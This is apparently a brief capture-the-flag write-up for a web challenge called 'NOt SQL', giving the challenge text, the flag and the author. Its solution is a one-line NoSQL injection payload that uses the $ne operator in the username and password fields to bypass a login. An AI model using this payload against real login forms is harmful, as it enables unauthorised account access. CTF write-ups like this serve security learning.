# NOt SQL

## Description

Last time i used SQL, i got hacked /(O_0/)  /_/  and now from my experience i am never using SQL again. Can you hack me now?

## Short Writeup

* A basic no sql injection
* username[$ne]=sdfdf&pass[$ne]=sddf

## Flag

`` inctf{n0SQL_15_n0t_s3cur3_6784}``

## Challenge Author

**[sk4d00.sh](https://twitter.com/RahulSundar8)**

